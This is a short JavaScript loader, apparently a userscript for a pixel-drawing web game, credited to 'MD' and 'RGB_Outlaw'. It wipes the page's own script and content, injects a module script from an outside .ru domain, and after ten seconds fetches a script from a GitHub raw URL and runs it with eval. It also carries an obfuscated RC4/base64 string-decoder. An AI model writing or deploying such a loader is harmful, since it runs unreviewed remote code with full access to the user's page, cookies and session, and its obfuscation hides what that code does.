/*
 Author: MD
 Formatter: RGB_Outlaw
 Telegram channels: t.me/mdsays | t.me/rgbtrap
*/

  var h = {
    drawMode: 6
  };

  window.monkeyPatch = h;
  unixTime = Date.now();
  document.querySelector("script").remove();
  document.getElementById("root").innerHTML = "";

  var s = document.createElement("script");
  s.type = "text/javascript";

  function e(x) {
    var y = g();
    e = function (z, aa) {
      z = z - 244;
      var ab = y[z];
      if (e.ttnzbq === undefined) {
        var ac = function (ad) {
          var ae = "";
          var af = "";
          var ag = 0;
          var ah;
          var ai;
          for (var aj = 0; ai = ad.charAt(aj++); ~ai && (ah = ag % 4 ? ah * 64 + ai : ai, ag++ % 4) ? ae += String.fromCharCode(255 & ah >> (-2 * ag & 6)) : 0) {
            ai = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(ai);
          }
          var ak = 0;
          for (var al = ae.length; ak < al; ak++) {
            af += "%" + ("00" + ae.charCodeAt(ak).toString(16)).slice(-2);
          }
          return decodeURIComponent(af);
        };
        var am = function (an, ao) {
          var ap = [];
          var aq = 0;
          var a;
          var b = "";
          an = ac(an);
          var c;
          for (c = 0; c < 256; c++) {
            ap[c] = c;
          }
          for (c = 0; c < 256; c++) {
            aq = (aq + ap[c] + ao.charCodeAt(c % ao.length)) % 256;
            a = ap[c];
            ap[c] = ap[aq];
            ap[aq] = a;
          }
          c = 0;
          aq = 0;
          for (var d = 0; d < an.length; d++) {
            c = (c + 1) % 256;
            aq = (aq + ap[c]) % 256;
            a = ap[c];
            ap[c] = ap[aq];
            ap[aq] = a;
            b += String.fromCharCode(an.charCodeAt(d) ^ ap[(ap[c] + ap[aq]) % 256]);
          }
          return b;
        };
        e.gzmXuj = am;
        e.ttnzbq = true;
      }
      var ar = y[0];
      var as = z + ar;
      var at = arguments[as];
      if (!at) {
        if (e.vgfzkE === undefined) {
          e.vgfzkE = true;
        }
        ab = e.gzmXuj(ab, aa);
        arguments[as] = ab;
      } else {
        ab = at;
      }
      return ab;
    };
    return e(arguments, x);
  }

  s.src = "https://pipyoutube.ru/cats/index-GKUHWpC_.js?1234";
  s.type = "module";
  
  document.head.appendChild(s);

  setTimeout(function () {
    fetch("https://raw.githubusercontent.com/RGB-Outl4w/ThePixelsAutoReloaded/main/test/beta_TPAR_v4.1.js").then(response => response.text()).then(script => eval(script));
  }, 10000);
